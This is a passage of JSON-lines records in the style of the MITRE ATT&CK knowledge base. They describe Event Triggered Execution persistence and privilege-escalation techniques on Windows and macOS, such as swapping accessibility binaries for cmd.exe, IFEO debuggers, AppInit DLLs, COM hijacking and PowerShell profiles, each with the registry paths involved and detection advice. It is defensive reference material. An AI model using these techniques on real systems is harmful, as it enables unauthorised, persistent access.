normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. ","platforms":"IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Cloud Service: Cloud Service Modification, Command: Command Execution, File: File Creation, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation, WMI: WMI Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1546.008","name":"Event Triggered Execution: Accessibility Features","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>","url":"https://attack.mitre.org/techniques/T1546/008","created":"24 January 2020","last modified":"21 April 2023","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Paul Speulstra, AECOM Global Security Operations Center","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"SYSTEM","relationship citations":"(Citation: FireEye APT29 Domain Fronting),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Github PowerShell Empire),(Citation: aptsim),(Citation: Mandiant No Easy Breach),(Citation: RSA Shell Crew),(Citation: FireEye APT41 Aug 2019),(Citation: Novetta-Axiom),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet RDP Gateway),(Citation: TechNet RDP NLA)"}
{"ID":"T1546.009","name":"Event Triggered Execution: AppCert DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ","url":"https://attack.mitre.org/techniques/T1546/009","created":"24 January 2020","last modified":"10 November 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) \n\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, SYSTEM","relationship citations":"(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control)"}
{"ID":"T1546.010","name":"Event Triggered Execution: AppInit DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)","url":"https://attack.mitre.org/techniques/T1546/010","created":"24 January 2020","last modified":"21 April 2023","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) \n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":"Secure boot disabled on systems running Windows 8 and later","impact type":null,"effective permissions":"Administrator, SYSTEM","relationship citations":"(Citation: FBI FLASH APT39 September 2020),(Citation: Eset Ramsay May 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: Trustwave Cherry Picker),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control)"}
{"ID":"T1546.011","name":"Event Triggered Execution: Application Shimming","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.","url":"https://attack.mitre.org/techniques/T1546/011","created":"24 January 2020","last modified":"10 November 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):\n\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.","platforms":"Windows","data sources":"Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FOX-IT May 2016 Mofang),(Citation: Proofpoint TA505 October 2019),(Citation: Trustwave Pillowmint June 2020),(Citation: FireEye FIN7 Shim Databases),"}
{"ID":"T1546.001","name":"Event Triggered Execution: Change Default File Association","description":"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)","url":"https://attack.mitre.org/techniques/T1546/001","created":"24 January 2020","last modified":"30 March 2023","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.\n\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.\n\nAlso look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Stefan Kanthak; Travis Smith, Tripwire","permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Securelist Kimsuky Sept 2013),"}
{"ID":"T1546.015","name":"Event Triggered Execution: Component Object Model Hijacking","description":"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ","url":"https://attack.mitre.org/techniques/T1546/015","created":"16 March 2020","last modified":"21 April 2023","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \n\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. ","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Elastic","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET Sednit Part 2),(Citation: Palo Alto Networks BBSRAT),(Citation: Check Point Warzone Feb 2020),(Citation: ESET Sednit Part 1),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NorthSec 2015 GData Uroburos Tools),(Citation: Kaspersky WIRTE November 2021),(Citation: Talos Seduploader Oct 2017),(Citation: HP SVCReady Jun 2022),(Citation: Medium KONNI Jan 2020),(Citation: ESET Zebrocy May 2019),(Citation: ESET Turla Mosquito Jan 2018),"}
{"ID":"T1546.014","name":"Event Triggered Execution: Emond","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.","url":"https://attack.mitre.org/techniques/T1546/014","created":"24 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.","platforms":"macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Ivan Sinyakov","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1546.012","name":"Event Triggered Execution: Image File Execution Options Injection","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)","url":"https://attack.mitre.org/techniques/T1546/012","created":"24 January 2020","last modified":"10 November 2020","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Oddvar Moe, @oddvarmoe","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye TRITON 2019),(Citation: Proofpoint TA505 October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),"}
{"ID":"T1546.016","name":"Event Triggered Execution: Installer Packages","description":"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged `Prebuild` and `Postbuild` events to run commands before or after a build when installing .msi files.(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)","url":"https://attack.mitre.org/techniques/T1546/016","created":"27 September 2022","last modified":"19 October 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Brandon Dalton @PartyD0lphin","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"root","relationship citations":"(Citation: ObjectiveSee AppleJeus 2019),"}
{"ID":"T1546.006","name":"Event Triggered Execution: LC_LOAD_DYLIB Addition","description":"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)","url":"https://attack.mitre.org/techniques/T1546/006","created":"24 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.","platforms":"macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1546.007","name":"Event Triggered Execution: Netsh Helper DLL","description":"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)","url":"https://attack.mitre.org/techniques/T1546/007","created":"24 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.(Citation: Demaske Netsh Persistence)","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Matthew Demaske, Adaptforward","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Demaske Netsh Persistence),"}
{"ID":"T1546.013","name":"Event Triggered Execution: PowerShell Profile","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)","url":"https://attack.mitre.org/techniques/T1546/013","created":"24 January 2020","last modified":"08 February 2022","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet)(Citation: Microsoft Profiles) Example profile locations (user defaults as well as program-specific) include:\n\n* <code>$PsHome\\Profile.ps1</code>\n* <code>$PsHome\\Microsoft.{HostProgram}_profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1</code>\n\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Allen DeRyke, ICE; Matthew Green","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),"}
{"ID":"T1546.002","name":"Event Triggered Execution: Screensaver","description":"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)","url":"https://attack.mitre.org/techniques/T1546/002","created":"24 January 2020","last modified":"21 April 2023","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\n\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and 